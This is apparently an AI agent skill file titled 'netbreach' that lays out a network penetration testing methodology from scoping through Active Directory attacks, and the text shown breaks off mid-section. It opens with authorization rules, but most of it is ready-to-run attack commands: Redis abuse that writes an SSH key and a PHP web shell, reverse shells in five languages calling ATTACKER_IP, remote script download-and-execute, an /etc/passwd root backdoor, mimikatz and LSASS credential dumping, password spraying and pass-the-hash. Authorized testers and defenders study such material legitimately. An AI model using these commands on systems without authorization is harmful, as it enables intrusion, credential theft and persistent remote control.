---
name: netbreach
description: Network penetration testing — full methodology from host discovery to post-exploitation. Covers Phase 0 (scoping + rules of engagement), Phase 1 (host discovery — nmap, masscan, ARP scan, IPv6), Phase 2 (service enumeration — version detection, banner grabbing, script scanning, UDP), Phase 3 (vulnerability assessment — CVE mapping, Nessus/OpenVAS parsing, exploit-db matching, default credentials), Phase 4 (exploitation — Metasploit, manual exploits, password attacks, service-specific attacks for SSH/SMB/RDP/FTP/SNMP/SMTP/DNS/LDAP/Kerberos/HTTP/MySQL/MSSQL/PostgreSQL/Redis/MongoDB), Phase 5 (post-exploitation — privilege escalation Linux/Windows, persistence, credential harvesting, pivoting, lateral movement), Phase 6 (Active Directory attacks — AS-REP roasting, Kerberoasting, Pass-the-Hash, DCSync, BloodHound, NTLM relay, certificate abuse), Phase 7 (wireless — WPA2/WPA3, evil twin, deauth, PMKID), Phase 8 (reporting — executive summary, technical findings, CVSS scoring, remediation). Use for ANY network pentest task — internal/external assessment, AD testing, infrastructure audit, vulnerability assessment, or when asked to "scan this network", "pentest this host", "attack this service", "escalate privileges", or "test Active Directory".
---

# Network Penetration Testing — Full Methodology

Host Discovery → Enumeration → Vulnerability Assessment → Exploitation → Post-Exploitation → Report.

---

## THE ONLY RULE THAT MATTERS

> **"Do you have WRITTEN AUTHORIZATION to test this target? If NO — STOP. Everything else is a crime."**
>
> No scope document = no testing. Period.

---

## CRITICAL RULES

1. **WRITTEN AUTHORIZATION FIRST** — signed scope document, rules of engagement, emergency contacts
2. **STAY IN SCOPE** — only test IP ranges, domains, and services explicitly authorized
3. **LOG EVERYTHING** — timestamps, commands, outputs, screenshots (CYA documentation)
4. **NO DESTRUCTIVE ACTIONS** without explicit approval — no DoS, no data deletion, no production disruption
5. **REPORT CRITICAL FINDINGS IMMEDIATELY** — don't wait for the report if you find RCE or active compromise
6. **TIME-BOX EXPLOITATION** — 30 min per service max, then move on
7. **ASSUME MONITORING** — blue team may be watching, behave professionally
8. **CREDENTIAL HANDLING** — never exfiltrate real credentials to external systems
9. **CLEAN UP** — remove all tools, shells, accounts, and artifacts after testing
10. **PROFESSIONAL CONDUCT** — you are testing security, not proving you're clever

---

## PHASE 0: SCOPING & RULES OF ENGAGEMENT

### Scope Document Template

```
PROJECT: _______________
CLIENT:  _______________
DATE:    _______________

TYPE:
  [ ] External (internet-facing)
  [ ] Internal (LAN/VPN)
  [ ] Wireless
  [ ] Active Directory
  [ ] Cloud Infrastructure (AWS/Azure/GCP)

IN SCOPE:
  IP Ranges:    _______________
  Domains:      _______________
  Services:     _______________
  Credentials:  [ ] Provided  [ ] Blind (find your own)

OUT OF SCOPE:
  IPs/Hosts:    _______________
  Services:     _______________
  Actions:      [ ] DoS  [ ] Social Engineering  [ ] Physical

RULES:
  Testing Window: _____ to _____ (timezone)
  Rate Limit:     ___ req/sec max
  Emergency Contact: _______________
  Critical Finding: Notify within ___ hours

AUTHORIZATION:
  Signed by:    _______________
  Date:         _______________
```

### Pre-Engagement Checklist

```
[ ] Written authorization signed
[ ] Scope document reviewed — ALL IPs/domains listed
[ ] Out-of-scope items confirmed
[ ] Testing window agreed
[ ] Emergency contacts exchanged
[ ] VPN/access credentials received (if internal)
[ ] Test environment vs production clarified
[ ] Backup policy confirmed (rollback plan)
[ ] Legal reviewed (if required)
[ ] Insurance confirmed (professional liability)
```

---

## PHASE 1: HOST DISCOVERY & NETWORK MAPPING

### 1A: Passive Reconnaissance (No Packets Sent to Target)

```bash
# OSINT — gather info before touching the network
# DNS records
dig +short $TARGET A
dig +short $TARGET AAAA
dig +short $TARGET MX
dig +short $TARGET TXT
dig +short $TARGET NS
dig axfr $TARGET @ns1.$TARGET  # Zone transfer (often blocked)

# Reverse DNS for IP range
nmap -sL 10.10.10.0/24 2>/dev/null | grep "Nmap scan report" | awk '{print $5, $6}'

# WHOIS
whois $TARGET | grep -iE "org|admin|tech|email|range|cidr"

# Shodan (internet-facing hosts)
shodan search "hostname:$TARGET" --fields ip_str,port,org,os 2>/dev/null
shodan host $TARGET_IP 2>/dev/null

# Certificate transparency
curl -s "https://crt.sh/?q=%.${TARGET}&output=json" | jq -r '.[].name_value' | sort -u
```

### 1B: Active Host Discovery

```bash
# ═══════════════════════════════════════════
# NMAP — The Foundation (always start here)
# ═══════════════════════════════════════════

# Ping sweep (find live hosts) — ICMP + TCP SYN + TCP ACK
nmap -sn 10.10.10.0/24 -oA scans/ping-sweep

# ARP scan (local subnet only — most reliable on LAN)
nmap -PR -sn 10.10.10.0/24 -oA scans/arp-sweep
# Or use arp-scan:
arp-scan -l -I eth0

# TCP SYN discovery (when ICMP is blocked)
nmap -PS22,80,443,445,3389 -sn 10.10.10.0/24 -oA scans/syn-discovery

# UDP discovery (SNMP, DNS, DHCP — often overlooked)
nmap -PU53,161,67 -sn 10.10.10.0/24 -oA scans/udp-discovery

# IPv6 discovery (many hosts have IPv6 enabled with weaker firewall rules)
nmap -6 -sn --script=targets-ipv6-multicast-echo fe80::/10 -oA scans/ipv6-discovery

# ═══════════════════════════════════════════
# MASSCAN — Fast (use for large ranges, /16 and above)
# ═══════════════════════════════════════════

# Quick top-port scan across large range
masscan 10.0.0.0/16 -p21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,8080,8443 \
  --rate=1000 -oG scans/masscan-quick.gnmap

# Full port scan on confirmed live hosts
masscan -iL scans/live-hosts.txt -p0-65535 --rate=500 -oG scans/masscan-full.gnmap
```

### 1C: Network Topology Mapping

```bash
# Traceroute to identify network segments
traceroute -n $TARGET_IP
# TCP traceroute (bypasses ICMP filtering)
nmap -sn --traceroute $TARGET_IP

# Identify routers/gateways
nmap -sn --script=broadcast-dhcp-discover -e eth0

# Identify VLANs (if on internal network)
# Look for 802.1Q tagged traffic
tcpdump -i eth0 -nn vlan
```

### Phase 1 Decision Gate

| What You Found | Next Action |
|---------------|-------------|
| Live hosts discovered | Phase 2 — enumerate services |
| Large range (>500 hosts) | Prioritize by open ports (80/443/445/3389 first) |
| No hosts respond to ping | Try TCP SYN discovery, ARP scan if on LAN |
| IPv6 hosts found | Scan IPv6 separately — often less firewalled |
| Nothing after full sweep | Verify scope, check firewall rules with client |

---

## PHASE 2: SERVICE ENUMERATION

> **"Enumeration is the difference between a script kiddie and a penetration tester."** The more you know about a service, the more precisely you can attack it.

### 2A: Port Scanning (Detailed)

```bash
# ═══════════════════════════════════════════
# STANDARD NMAP SCANS
# ═══════════════════════════════════════════

# Quick top-1000 TCP scan with version detection
nmap -sV -sC -O -oA scans/nmap-quick $TARGET_IP

# Full TCP port scan (all 65535 ports)
nmap -p- -sV --min-rate=1000 -oA scans/nmap-full $TARGET_IP

# Aggressive scan (version + scripts + OS + traceroute)
nmap -A -T4 -oA scans/nmap-aggressive $TARGET_IP

# UDP scan (top 20 — UDP is slow, be selective)
nmap -sU --top-ports 20 -sV -oA scans/nmap-udp $TARGET_IP

# UDP specific high-value ports
nmap -sU -p53,67,68,69,123,161,162,500,514,520,1900,4500,5353 -sV -oA scans/nmap-udp-specific $TARGET_IP

# Vulnerability scan (NSE scripts)
nmap --script=vuln -oA scans/nmap-vuln $TARGET_IP

# Safe scripts only (non-intrusive)
nmap --script=safe -oA scans/nmap-safe $TARGET_IP
```

### 2B: Service-Specific Enumeration

#### HTTP/HTTPS (80, 443, 8080, 8443)

```bash
# Technology detection
whatweb $TARGET_URL 2>/dev/null
curl -sI $TARGET_URL | grep -iE "server|x-powered-by|x-aspnet|set-cookie"

# Directory fuzzing
gobuster dir -u $TARGET_URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,asp,aspx,jsp,html,js,txt,bak -t 50 -o scans/gobuster.txt
# Or with ffuf:
ffuf -u $TARGET_URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -ac -o scans/ffuf.json

# Virtual host discovery
ffuf -u http://$TARGET_IP -H "Host: FUZZ.$TARGET" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac

# Nikto web scanner
nikto -h $TARGET_URL -o scans/nikto.txt

# SSL/TLS analysis
sslscan $TARGET_IP:443
testssl.sh $TARGET_URL
nmap --script ssl-enum-ciphers -p 443 $TARGET_IP
```

#### SMB (445, 139)

```bash
# Enumerate shares, users, groups
enum4linux -a $TARGET_IP 2>/dev/null | tee scans/enum4linux.txt

# SMB shares (null session)
smbclient -L //$TARGET_IP -N
smbmap -H $TARGET_IP
smbmap -H $TARGET_IP -u '' -p ''

# CrackMapExec — SMB enum + credential testing
crackmapexec smb $TARGET_IP --shares
crackmapexec smb $TARGET_IP --users
crackmapexec smb $TARGET_IP --pass-pol

# Check for EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p445 $TARGET_IP

# Enumerate with credentials
smbmap -H $TARGET_IP -u 'user' -p 'password'
smbclient //$TARGET_IP/share -U 'user%password'
```

#### SSH (22)

```bash
# Banner grab + auth methods
nmap -sV -p22 --script ssh2-enum-algos,ssh-auth-methods $TARGET_IP

# Check for weak key exchange / ciphers
nmap --script ssh2-enum-algos -p22 $TARGET_IP | grep -A20 "kex_algorithms\|encryption_algorithms"

# Brute force (ONLY with authorization)
hydra -L users.txt -P passwords.txt ssh://$TARGET_IP -t 4
# Or:
crackmapexec ssh $TARGET_IP -u users.txt -p passwords.txt
```

#### DNS (53)

```bash
# Zone transfer
dig axfr $TARGET @$DNS_SERVER
host -t axfr $TARGET $DNS_SERVER

# DNS enumeration
dnsenum $TARGET
dnsrecon -d $TARGET -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Check for DNS cache snooping
nmap --script dns-cache-snoop -p53 $DNS_SERVER
```

#### SNMP (161/UDP)

```bash
# Community string brute (public/private are defaults)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET_IP

# Full SNMP walk (if community string known)
snmpwalk -v2c -c public $TARGET_IP
snmpwalk -v2c -c public $TARGET_IP 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v2c -c public $TARGET_IP 1.3.6.1.2.1.25.6.3.1.2  # Installed software
snmpwalk -v2c -c public $TARGET_IP 1.3.6.1.4.1.77.1.2.25   # User accounts (Windows)
snmpwalk -v2c -c public $TARGET_IP 1.3.6.1.2.1.6.13.1.3    # Open TCP ports

# SNMPv3 enumeration
nmap --script snmp-info -p161 -sU $TARGET_IP
```

#### SMTP (25, 465, 587)

```bash
# User enumeration via VRFY / EXPN / RCPT TO
smtp-user-enum -M VRFY -U users.txt -t $TARGET_IP
smtp-user-enum -M RCPT -U users.txt -t $TARGET_IP -D $TARGET

# Nmap SMTP scripts
nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1764 -p25 $TARGET_IP

# Test open relay
nmap --script smtp-open-relay -p25 $TARGET_IP
```

#### LDAP (389, 636)

```bash
# Anonymous bind enumeration
ldapsearch -x -H ldap://$TARGET_IP -b "DC=domain,DC=local" -s base namingContexts
ldapsearch -x -H ldap://$TARGET_IP -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# Nmap LDAP scripts
nmap --script ldap-rootdse,ldap-search -p389 $TARGET_IP
```

#### RDP (3389)

```bash
# RDP enumeration
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p3389 $TARGET_IP

# Check for NLA (Network Level Authentication)
nmap --script rdp-ntlm-info -p3389 $TARGET_IP

# BlueKeep check (CVE-2019-0708)
nmap --script rdp-vuln-ms12-020 -p3389 $TARGET_IP

# RDP brute force
hydra -L users.txt -P passwords.txt rdp://$TARGET_IP -t 4
crowbar -b rdp -s $TARGET_IP/32 -u admin -C passwords.txt
```

#### FTP (21)

```bash
# Anonymous login check
ftp $TARGET_IP  # Try: anonymous / anonymous@
nmap --script ftp-anon -p21 $TARGET_IP

# FTP bounce scan
nmap -b anonymous@$TARGET_IP $INTERNAL_TARGET

# ProFTPd/vsFTPd exploit check
nmap --script ftp-vuln* -p21 $TARGET_IP
searchsploit "$(nmap -sV -p21 $TARGET_IP | grep '21/tcp' | awk '{print $4,$5}')"
```

#### Database Services

```bash
# MySQL (3306)
nmap --script mysql-enum,mysql-info,mysql-vuln-cve2012-2122 -p3306 $TARGET_IP
mysql -h $TARGET_IP -u root -p  # Try empty password
hydra -L users.txt -P passwords.txt mysql://$TARGET_IP

# MSSQL (1433)
nmap --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info -p1433 $TARGET_IP
# With credentials:
impacket-mssqlclient user:password@$TARGET_IP -windows-auth

# PostgreSQL (5432)
nmap --script pgsql-brute -p5432 $TARGET_IP
psql -h $TARGET_IP -U postgres  # Try empty password

# Redis (6379)
redis-cli -h $TARGET_IP info
redis-cli -h $TARGET_IP config get *  # Any auth?
nmap --script redis-info -p6379 $TARGET_IP

# MongoDB (27017)
mongosh --host $TARGET_IP --eval "db.adminCommand('listDatabases')" 2>/dev/null
nmap --script mongodb-info -p27017 $TARGET_IP
```

### 2C: Enumeration Output Parsing

```bash
# Parse nmap XML for quick reference
# List all open ports per host
xmlstarlet sel -t -m "//host[status/@state='up']" \
  -v "address[@addrtype='ipv4']/@addr" -o ": " \
  -m "ports/port[state/@state='open']" -v "@portid" -o "/" -v "service/@name" -o " " \
  -n scans/nmap-full.xml 2>/dev/null

# Or use grep on gnmap
grep "open" scans/nmap-full.gnmap | awk '{print $2, $4}'
```

---

## PHASE 3: VULNERABILITY ASSESSMENT

### 3A: CVE Mapping

```bash
# Searchsploit — match service versions to known exploits
searchsploit "Apache 2.4.49"
searchsploit "OpenSSH 7.6"
searchsploit "ProFTPD 1.3.5"
searchsploit "vsftpd 2.3.4"
searchsploit "Samba 3.0"

# Nmap vuln scripts (safe + comprehensive)
nmap --script=vuln --script-args=unsafe=0 -oA scans/nmap-vuln $TARGET_IP

# Nuclei against discovered web services
nuclei -u $TARGET_URL -severity critical,high,medium -o scans/nuclei.txt
```

### 3B: Default Credential Testing

```bash
# Common defaults to try on every service
```

| Service | Default Credentials |
|---------|-------------------|
| SSH | root:root, admin:admin, root:toor |
| FTP | anonymous:anonymous, ftp:ftp |
| MySQL | root:(empty), root:root, root:mysql |
| PostgreSQL | postgres:postgres, postgres:(empty) |
| MSSQL | sa:sa, sa:(empty) |
| MongoDB | (no auth by default) |
| Redis | (no auth by default) |
| Tomcat | tomcat:tomcat, admin:admin, manager:manager |
| Jenkins | admin:admin, admin:password |
| WordPress | admin:admin, admin:password |
| Grafana | admin:admin |
| phpMyAdmin | root:(empty) |
| SNMP | public, private, community |
| VNC | (empty password) |
| Telnet | admin:admin, root:root |

```bash
# CrackMapExec — batch default credential testing
crackmapexec smb targets.txt -u admin -p admin
crackmapexec ssh targets.txt -u root -p root
crackmapexec winrm targets.txt -u administrator -p password
```

### 3C: Vulnerability Scanner Integration

```bash
# Nessus — parse exported CSV/JSON
# Export from Nessus UI → parse critical/high findings
cat nessus-export.csv | awk -F',' '$4 ~ /Critical|High/ {print $5, $7, $8}' | sort -u

# OpenVAS — parse XML report
# Focus on CVSS >= 7.0
xmlstarlet sel -t -m "//result[threat='High' or threat='Critical']" \
  -v "host" -o " | " -v "name" -o " | CVSS:" -v "severity" -n report.xml

# Manual CVE verification — always verify scanner findings
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-XXXX-XXXXX" | jq '.vulnerabilities[0].cve.descriptions[0].value'
```

### 3D: Password Attack Strategy

```bash
# ═══════════════════════════════════════════
# RULE: Start with targeted attacks, THEN brute force
# ═══════════════════════════════════════════

# Step 1: Credential stuffing (known leaked creds)
# Use breach databases responsibly (only with authorization)

# Step 2: Password spraying (few passwords, many users)
# Low and slow to avoid lockout
crackmapexec smb $TARGET_IP -u users.txt -p 'Password1' --no-bruteforce
crackmapexec smb $TARGET_IP -u users.txt -p 'Welcome1' --no-bruteforce
crackmapexec smb $TARGET_IP -u users.txt -p 'Summer2024!' --no-bruteforce
# Wait between sprays to avoid lockout (check lockout policy first)

# Step 3: Targeted brute force (single service, specific user)
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET_IP ssh -t 4 -W 5
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET_IP http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Step 4: Hash cracking (after obtaining hashes)
# Identify hash type
hashid '$hash_value'
hash-identifier

# Crack with hashcat
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt     # MD5
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA-512 (Linux shadow)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt # Kerberoast
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt # AS-REP roast

# Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

---

## PHASE 4: EXPLOITATION

### 4A: Exploitation Decision Framework

```
Service identified with known vuln?
├── CVE with public exploit
│   ├── Metasploit module exists → use it (fastest)
│   ├── PoC on exploit-db/GitHub → review code, modify, run
│   └── No public exploit → write custom or skip
├── Default/weak credentials
│   ├── Admin panel access → post-exploitation
│   ├── Database access → dump data, attempt RCE
│   └── SSH/RDP access → direct shell
├── Misconfiguration
│   ├── Anonymous FTP/SMB → check for sensitive files
│   ├── Open Redis/MongoDB → check for data, attempt RCE
│   └── Debug endpoints → info leak, potential RCE
└── Web application vulnerability
    └── Delegate to web2 vuln hunting skills
```

### 4B: Metasploit Quick Reference

```bash
# Search for exploits
msfconsole -q
search type:exploit name:eternalblue
search type:exploit platform:linux cve:2021

# Standard exploit workflow
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $TARGET_IP
set LHOST $ATTACKER_IP
set LPORT 4444
show options   # Verify all required options set
exploit

# Common modules
use exploit/multi/handler                    # Catch reverse shells
use exploit/windows/smb/ms17_010_eternalblue # EternalBlue
use exploit/windows/smb/ms08_067_netapi      # Conficker
use exploit/unix/ftp/vsftpd_234_backdoor     # vsFTPd 2.3.4
use exploit/multi/http/tomcat_mgr_upload     # Tomcat manager
use exploit/linux/http/apache_mod_cgi_bash_env_exec  # Shellshock

# Post-exploitation modules
use post/multi/gather/credentials             # Credential harvesting
use post/windows/gather/hashdump              # SAM dump
use post/linux/gather/hashdump                # Shadow file
use post/multi/manage/autoroute               # Pivoting
```

### 4C: Manual Exploitation — Common Services

#### Exploiting Redis (6379)

```bash
# Check for unauthenticated access
redis-cli -h $TARGET_IP info server

# Write SSH key for shell access
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/redis-key.txt
redis-cli -h $TARGET_IP flushall
cat /tmp/redis-key.txt | redis-cli -h $TARGET_IP -x set ssh_key
redis-cli -h $TARGET_IP config set dir /root/.ssh
redis-cli -h $TARGET_IP config set dbfilename authorized_keys
redis-cli -h $TARGET_IP save
ssh root@$TARGET_IP

# Write web shell (if web root known)
redis-cli -h $TARGET_IP config set dir /var/www/html
redis-cli -h $TARGET_IP config set dbfilename shell.php
redis-cli -h $TARGET_IP set webshell '<?php system($_GET["cmd"]); ?>'
redis-cli -h $TARGET_IP save
```

#### Exploiting NFS (2049)

```bash
# Show exported shares
showmount -e $TARGET_IP

# Mount share
mkdir /tmp/nfs-mount
mount -t nfs $TARGET_IP:/share /tmp/nfs-mount -o nolock

# Check for sensitive files
find /tmp/nfs-mount -name "*.conf" -o -name "*.key" -o -name "*.pem" -o -name "id_rsa" -o -name "shadow" -o -name ".bash_history" 2>/dev/null

# Root squash bypass (if no_root_squash is set)
# Create SUID binary on NFS share as root
```

#### Exploiting MSSQL (1433)

```bash
# With credentials — command execution via xp_cmdshell
impacket-mssqlclient user:password@$TARGET_IP -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell "powershell -e BASE64_PAYLOAD"

# Capture NTLM hash via UNC path
SQL> exec master..xp_dirtree '\\ATTACKER_IP\share'
# Listen with Responder / Impacket-smbserver on attacker machine
```

### 4D: Reverse Shell Cheat Sheet

```bash
# ═══════════════════════════════════════════
# LISTENER (run on attacker machine first)
# ═══════════════════════════════════════════
nc -nlvp 4444
# Or with rlwrap for readline:
rlwrap nc -nlvp 4444

# ═══════════════════════════════════════════
# REVERSE SHELLS (run on target)
# ═══════════════════════════════════════════

# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# ═══════════════════════════════════════════
# UPGRADE SHELL TO INTERACTIVE TTY
# ═══════════════════════════════════════════
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## PHASE 5: POST-EXPLOITATION

### 5A: Linux Privilege Escalation

```bash
# ═══════════════════════════════════════════
# AUTOMATED ENUMERATION (run first)
# ═══════════════════════════════════════════

# LinPEAS (most comprehensive)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or transfer via HTTP:
# Attacker: python3 -m http.server 8000
# Target: curl http://ATTACKER_IP:8000/linpeas.sh | sh

# LinEnum
wget http://ATTACKER_IP:8000/LinEnum.sh && bash LinEnum.sh

# ═══════════════════════════════════════════
# MANUAL CHECKS (prioritized by success rate)
# ═══════════════════════════════════════════

# 1. SUID binaries (most common privesc)
find / -perm -4000 -type f 2>/dev/null
# Check each against: https://gtfobins.github.io/

# 2. Sudo permissions
sudo -l
# If (ALL) NOPASSWD → instant root
# If specific binary → check GTFOBins

# 3. Cron jobs running as root
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
# Check if any cron script is WRITABLE by current user
find /etc/cron* -writable 2>/dev/null

# 4. Writable /etc/passwd (rare but instant root)
ls -la /etc/passwd
# If writable: echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd

# 5. Kernel exploits (last resort — may crash system)
uname -a
cat /etc/os-release
# Search: searchsploit "Linux Kernel $(uname -r | cut -d'-' -f1)"

# 6. Capabilities
getcap -r / 2>/dev/null
# python3 cap_setuid → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 7. Internal services running as root
ss -tlnp
netstat -tlnp
# Services on 127.0.0.1 may be exploitable locally

# 8. Sensitive files
find / -name "*.bak" -o -name "*.old" -o -name "*.conf" -o -name "*.log" 2>/dev/null | grep -v proc
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null

# 9. Docker/container escape
id | grep docker      # Are we in docker group?
ls -la /var/run/docker.sock  # Docker socket accessible?
# If docker group: docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# 10. PATH hijacking
echo $PATH
# If writable directory before system dirs in PATH → create malicious binary
```

### 5B: Windows Privilege Escalation

```bash
# ═══════════════════════════════════════════
# AUTOMATED ENUMERATION
# ═══════════════════════════════════════════

# WinPEAS
certutil -urlcache -f http://ATTACKER_IP:8000/winPEASx64.exe winpeas.exe
.\winpeas.exe

# PowerUp
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/PowerUp.ps1'); Invoke-AllChecks"

# Seatbelt
.\Seatbelt.exe -group=all

# ═══════════════════════════════════════════
# MANUAL CHECKS (prioritized)
# ═══════════════════════════════════════════

# 1. Check current privileges
whoami /all
whoami /priv

# Key privileges to abuse:
# SeImpersonatePrivilege → Potato attacks (JuicyPotato, PrintSpoofer, GodPotato)
# SeBackupPrivilege → Copy SAM/SYSTEM for hash extraction
# SeDebugPrivilege → Inject into SYSTEM process
# SeLoadDriverPrivilege → Load vulnerable driver

# 2. Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
# If unquoted path with spaces → plant malicious exe

# 3. Weak service permissions
accesschk64.exe -wuvc * /accepteula
# Or PowerShell:
Get-WmiObject win32_service | Select-Object Name, StartName, PathName | Where-Object {$_.StartName -eq "LocalSystem"}

# 4. AlwaysInstallElevated (MSI runs as SYSTEM)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1: msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=Y -f msi > shell.msi

# 5. Stored credentials
cmdkey /list
# If stored: runas /savecred /user:admin cmd.exe

# 6. SAM/SYSTEM backup files
dir C:\Windows\Repair\SAM 2>nul
dir C:\Windows\System32\config\RegBack\SAM 2>nul

# 7. Scheduled tasks
schtasks /query /fo LIST /v | findstr /i "task to run\|run as user"

# 8. Sensitive files
dir /s /b C:\Users\*password* C:\Users\*cred* C:\Users\*.kdbx 2>nul
findstr /si "password" *.txt *.xml *.ini *.config 2>nul

# 9. Recently installed software (potential vulns)
wmic product get name,version

# 10. Network connections / internal services
netstat -ano
```

### 5C: Credential Harvesting

```bash
# Linux
cat /etc/shadow           # Password hashes (need root)
cat /etc/passwd            # User list
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
cat /home/*/.bash_history 2>/dev/null | grep -i "pass\|ssh\|mysql\|psql"
# Browser credentials: ~/.mozilla/firefox/*.default/logins.json

# Windows
# Mimikatz (requires admin/SYSTEM)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all" "exit"

# SAM dump (offline)
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# Transfer to attacker → impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# LSASS dump
procdump.exe -ma lsass.exe lsass.dmp
# Or: Task Manager → lsass.exe → Create dump file
# Transfer → pypykatz lsa minidump lsass.dmp
```

### 5D: Pivoting & Lateral Movement

```bash
# ═══════════════════════════════════════════
# SSH TUNNELING (most common)
# ═══════════════════════════════════════════

# Local port forward (access internal service via compromised host)
ssh -L 8080:INTERNAL_TARGET:80 user@PIVOT_HOST
# Now: http://localhost:8080 → reaches INTERNAL_TARGET:80

# Dynamic SOCKS proxy (route all traffic through compromised host)
ssh -D 9050 user@PIVOT_HOST
# Then: proxychains nmap -sT INTERNAL_TARGET

# Remote port forward (expose attacker service to internal network)
ssh -R 8443:localhost:443 user@PIVOT_HOST

# ═══════════════════════════════════════════
# CHISEL (no SSH needed)
# ═══════════════════════════════════════════

# Attacker: ./chisel server --reverse --port 8080
# Target:   ./chisel client ATTACKER_IP:8080 R:socks

# ═══════════════════════════════════════════
# LATERAL MOVEMENT (Windows/AD)
# ═══════════════════════════════════════════

# PSExec (requires admin creds)
impacket-psexec domain/user:password@$TARGET_IP
# Or Metasploit: use exploit/windows/smb/psexec

# WMI execution
impacket-wmiexec domain/user:password@$TARGET_IP

# WinRM (PowerShell remoting)
evil-winrm -i $TARGET_IP -u user -p password

# Pass-the-Hash (don't need plaintext password)
impacket-psexec -hashes LM:NTLM user@$TARGET_IP
crackmapexec smb $TARGET_IP -u user -H NTLM_HASH
evil-winrm -i $TARGET_IP -u user -H NTLM_HASH

# RDP with hash
xfreerdp /v:$TARGET_IP /u:user /pth:NTLM_HASH
```

---

## PHASE 6: ACTIVE DIRECTORY ATTACKS

> **AD is the crown jewel of internal pentests.** Domain Admin = game over.

### 6A: AD Enumeration

```bash
# BloodHound — visual AD attack path mapping
# Collect data:
bloodhound-python -u user -p password -d domain.local -ns $DC_IP -c All
# Or SharpHound on Windows:
.\SharpHound.exe -c All --zipfilename bloodhound.zip

# Import into BloodHound GUI → find shortest path to Domain Admin

# Manual AD enumeration with PowerView
Import-Module .\PowerView.ps1
Get-DomainUser | Select-Object samaccountname,description
Get-DomainGroup -AdminCount | Select-Object samaccountname
Get-DomainComputer | Select-Object dnshostname,operatingsystem
Find-DomainShare -CheckShareAccess
Get-DomainGPO | Select-Object displayname,gpcfilesyspath

# CrackMapExec AD enum
crackmapexec smb $DC_IP -u user -p password --users
crackmapexec smb $DC_IP -u user -p password --groups
crackmapexec smb $DC_IP -u user -p password --shares
crackmapexec ldap $DC_IP -u user -p password --password-not-required
```

### 6B: AD Attack Paths

#### AS-REP Roasting (No Pre-Authentication)

```bash
# Find accounts with "Do not require Kerberos preauthentication"
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip $DC_IP -format hashcat
# Or with credentials:
impacket-GetNPUsers domain.local/user:password -dc-ip $DC_IP -request -format hashcat

# Crack AS-REP hashes
